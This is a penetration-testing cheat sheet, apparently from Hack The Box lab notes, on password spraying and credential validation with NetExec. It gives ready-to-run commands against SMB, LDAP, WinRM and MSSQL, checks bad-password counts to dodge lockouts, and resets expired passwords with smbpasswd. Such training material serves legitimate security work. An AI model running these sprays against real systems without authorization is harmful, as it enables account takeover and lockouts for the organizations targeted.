# 06.14 Password Spraying Credential Validation

> Spray multi-protocol with `nxc smb/ldap/winrm/mssql/rdp/ssh/ftp` — `--no-bruteforce` pairs user-pass line-by-line.

## Overview

CME supports multi-protocol spraying (SMB, LDAP, WinRM, MSSQL, RDP, SSH, FTP). `--no-bruteforce` pairs each user with its corresponding password line-by-line. `--local-auth` tests local accounts. LDAP requires FQDN (not IP). MSSQL supports three auth types: AD domain, local Windows (`-d .`), and SQL account (`--local-auth`). Use `smbpasswd` to change STATUS_PASSWORD_MUST_CHANGE accounts.

## Steps

- `-u users.txt -p password` — spray one password across all users; CME stops at first hit.
- Add `--continue-on-success` to test all accounts even after finding valid credentials.
- `-u userfound.txt -p passfound.txt --no-bruteforce` — validate known user:pass pairs (1st:1st, 2nd:2nd).
- `--local-auth` — spray local SAM accounts; does NOT work against Domain Controllers.
- LDAP spraying requires FQDN; add `dc01.<DOMAIN>.htb` to `/etc/hosts`.
- MSSQL: omit `-d` for AD auth, use `-d .` for local Windows accounts, use `--local-auth` for SQL accounts.
- Check bad password counts with `nxc smb <target> --users -u <user> -p <pass>` — shows `badpwdcount`.
- For `STATUS_PASSWORD_MUST_CHANGE`: use `smbpasswd -r <DC_IP> -U <user>` to reset, then re-authenticate.

## Commands

### Spray single password over user file

```bash
nxc smb <TARGET> -u users.txt -p <PASS>
```

### Spray multiple users and passwords with continue

```bash
nxc smb <TARGET> -u noemi grace david carlos -p <PASS> <PASS> --continue-on-success
```

### Spray user list against password list

```bash
nxc smb <TARGET> -u users.txt -p passwords.txt
```

### Validate known user:pass pairs (no bruteforce)

```bash
nxc smb <TARGET> -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

### Test local administrator account

```bash
nxc smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
```

### WinRM spray (no bruteforce)

```bash
nxc winrm <TARGET> -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

### LDAP spray (requires FQDN)

```bash
nxc ldap dc01.<DOMAIN>.htb -u julio grace -p <PASS>
```

### MSSQL AD domain account spray

```bash
nxc mssql <TARGET> -u julio grace jorge -p <PASS>
```

### MSSQL local Windows account spray

```bash
nxc mssql <TARGET> -u julio grace -p <PASS> -d .
```

### MSSQL SQL account spray

```bash
nxc mssql <TARGET> -u julio grace -p <PASS> --local-auth
```

### Check bad password counts

```bash
nxc smb <TARGET> --users -u grace -p <PASS>
```

### Change STATUS_PASSWORD_MUST_CHANGE account

```bash
smbpasswd -r <TARGET> -U peter
```
